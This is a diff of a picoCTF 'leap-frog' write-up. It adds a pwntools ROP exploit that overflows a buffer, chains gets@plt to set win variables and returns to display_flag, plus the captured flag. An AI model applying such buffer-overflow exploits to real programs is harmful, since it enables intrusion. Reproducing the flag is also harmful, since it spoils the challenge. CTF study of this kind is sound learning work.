@@ -89,25 +89,52 @@ int main(int argc, char **argv){
 ```
 </details>
 
-leapA() = win1 to true
-leap2(arg1) = win2 to true IF win3 is true and arg1 is 0xDEADBEEF
-leap3() = win3 to true if win1 is true and win1 is not true??? Confusing...
-
-if win1/win2/win3 are true and we return to display_flag we should get the flag printed
-
-Lets start by finding our offset which should be close to 16 according to the sourcecode
+---post ctf update----
 
 
-**pwn cyclic 50 | strace ./rop**
+Looks like we can use gets plt to change the win variables to true while calling the display flag
+
+
+---------------------
+
+
+<details>
+  <summary>exploit</summary>
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+import os
+
+argv = sys.argv
+
+#lead elf and get addresses
+e = ELF('./rop')
+gets_plt = e.plt['gets']
+display_flag = e.symbols['display_flag']
+win1 = e.symbols['win1']
+
+if len(argv) > 1:
+  from getpass import getpass
+  ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
+  p = ssh.process('rop', cwd='/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897')
+else:
+  p = process('./rop')
+
+payload = ''
+payload+= 'A'*28
+payload+= p32(gets_plt)     #calls gets function so we can write the win variables
+payload+= p32(display_flag)   #returns to display flag
+payload+= p32(win1)       #allows us to write to win1 address
+p.sendlineafter('>', payload)
+p.sendline('\x01'*3)      #writes the value 1 to win1, win2, and win3
+p.interactive()
 ```
-read(0, "aaaabaaacaaadaaaeaaafaaagaaahaaa"..., 4096) = 50
-read(0, "", 4096)                       = 0
---- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616168} ---
-+++ killed by SIGSEGV +++
-Segmentation fault
-```
-**pwn cyclic -l 0x61616168**
-``
-28
-``
+</details>
 
+<details>
+  <summary>Flag</summary>
+
+picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_322ee522}
+</details>
